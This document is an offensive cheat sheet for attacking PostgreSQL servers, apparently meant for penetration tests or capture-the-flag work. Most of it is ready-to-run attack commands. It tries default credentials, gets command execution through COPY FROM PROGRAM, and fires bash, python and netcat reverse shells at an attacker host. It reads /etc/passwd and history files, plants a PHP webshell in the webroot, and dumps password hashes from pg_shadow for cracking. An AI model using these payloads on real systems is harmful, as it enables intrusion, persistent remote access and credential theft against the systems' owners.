# ════════════════════════════════════════════════════════
# 1. CONNECT — use the REAL port from your scan (NOT assumed 5432)
# ════════════════════════════════════════════════════════
psql -h $ip -p 5432 -U postgres            # change -p to the scanned port (5433/5437/...)
PGPASSWORD=postgres psql -h $ip -p 5432 -U postgres   # non-interactive
# Default creds to try: postgres:postgres | postgres:<blank> | postgres:password
# Validate fast from Kali:
nxc postgres $ip -u postgres -p postgres

# ════════════════════════════════════════════════════════
# 2. AM I SUPERUSER? (decides whether COPY PROGRAM works)
# ════════════════════════════════════════════════════════
\du                                        # look for 'Superuser' on your role
SELECT current_user, usesuper FROM pg_user WHERE usename = current_user;

# ════════════════════════════════════════════════════════
# 3. RCE via COPY FROM PROGRAM  (superuser / pg_execute_server_program)
# ════════════════════════════════════════════════════════
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(output text);
COPY cmd_exec FROM PROGRAM 'id';           # TEST execution first
SELECT * FROM cmd_exec;

# Confirmed? Fire the reverse shell (listener: nc -nlvp $lport):
COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/$lhost/$lport 0>&1"';

# bash -i not present / exits 1? use a different payload:
COPY cmd_exec FROM PROGRAM 'python3 -c ''import socket,os,pty;s=socket.socket();s.connect(("$lhost",$lport));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")''';
COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f';

# See what shells/tools exist before guessing a payload:
COPY cmd_exec FROM PROGRAM 'which nc python python3 bash socat; ls -la /bin/sh';
SELECT * FROM cmd_exec;

# ════════════════════════════════════════════════════════
# 4. FILE READ (fallback when not superuser, or for loot)
# ════════════════════════════════════════════════════════
DROP TABLE IF EXISTS read_files;
CREATE TABLE read_files(output text);
COPY read_files FROM '/etc/passwd';        # NOTE: no parentheses around the path!
SELECT * FROM read_files;
# function-based read (needs superuser or pg_read_server_files):
SELECT pg_read_file('/etc/passwd');
SELECT pg_ls_dir('/var/lib/postgresql');

# High-value reads:
COPY read_files FROM '/var/lib/postgresql/.psql_history';   # past queries, often creds
COPY read_files FROM '/var/lib/postgresql/.bash_history';

# ════════════════════════════════════════════════════════
# 5. WRITE A WEBSHELL (if a writable webroot exists)
# ════════════════════════════════════════════════════════
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

# ════════════════════════════════════════════════════════
# 6. LOOT — creds in the DB + postgres hashes (reuse for SSH/other)
# ════════════════════════════════════════════════════════
\l                                         # databases
\c <dbname>
\dt                                        # tables
SELECT * FROM users;                       # whatever \dt reveals
SELECT usename, passwd FROM pg_shadow;      # SCRAM/MD5 hashes -> hashcat -m 28600 / -m 0
